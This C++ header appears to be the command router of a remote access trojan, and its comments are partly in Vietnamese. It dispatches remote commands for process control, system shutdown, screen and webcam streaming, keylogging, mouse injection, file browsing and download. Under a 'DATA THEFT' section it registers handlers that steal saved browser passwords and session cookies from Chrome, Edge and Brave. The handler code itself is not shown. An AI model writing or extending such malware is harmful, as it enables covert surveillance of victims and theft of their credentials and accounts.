#pragma once
#include <unordered_map>
#include <functional>
#include <nlohmann/json.hpp>
#include "ProcessHandlers.h"
#include "FileHandlers.h"
#include "ChromeRecovery.h"

using json = nlohmann::json;

class Router
{
public:
    using Handler = std::function<json(const json &)>;

    static json dispatch(const std::unordered_map<std::string, Handler> &map, const json &req)
    {
        std::string cmd = req.value("command", "");
        auto it = map.find(cmd);
        if (it != map.end())
        {
            return it->second(req);
        }
        return {{"type", "error"}, {"message", "unknown command: " + cmd}};
    }

    static void registerAllHandlers(std::unordered_map<std::string, Handler> &map)
    {
        // === HỆ THỐNG ===
        map["list_processes"] = ProcessHandlers::listProcesses;
        map["start_process"] = ProcessHandlers::startProcess;
        map["stop_process_pid"] = ProcessHandlers::stopProcessPid;

        map["list_applications"] = ProcessHandlers::listApps;
        map["start_application"] = ProcessHandlers::startApp;
        map["stop_application"] = ProcessHandlers::stopApp;

        map["system_shutdown"] = ProcessHandlers::systemShutdown;
        map["system_restart"] = ProcessHandlers::systemRestart;

        // === MÀN HÌNH ===
        map["capture_screen"] = ProcessHandlers::captureScreen;
        map["start_screen_stream"] = ProcessHandlers::startScreenStream;
        map["stop_screen_stream"] = ProcessHandlers::stopScreenStream;

        // === WEBCAM ===
        map["start_webcam_record"] = ProcessHandlers::startWebcamRecord;
        map["stop_webcam_record"] = ProcessHandlers::stopWebcamRecord;
        map["start_webcam_stream"] = ProcessHandlers::startWebcamStream;
        map["stop_webcam_stream"] = ProcessHandlers::stopWebcamStream;

        // === KEYLOGGER & MOUSE ===
        map["start_keylog"] = ProcessHandlers::startKeylog;
        map["stop_keylog"] = ProcessHandlers::stopKeylog;
        map["mouse_input"] = ProcessHandlers::handleMouseInput;

        // FILE MANAGER HANDLERS
        map["fs_drives"] = FileHandlers::listDrives;
        map["fs_list"] = FileHandlers::listDirectory;
        map["fs_mkdir"] = FileHandlers::createDirectory;
        map["fs_mkfile"] = FileHandlers::createFile;
        map["fs_delete"] = FileHandlers::deleteItem;
        map["fs_download"] = FileHandlers::downloadFile;

        // === DATA THEFT ===
        map["steal_credentials"] = ChromeRecovery::handleStealCredentials; // Lấy Pass (Edge/Chrome cũ)
        map["steal_cookies_cdp"] = ProcessHandlers::stealCookiesCDP;       // Lấy Cookie (Brave/Chrome mới - CDP)
    }
};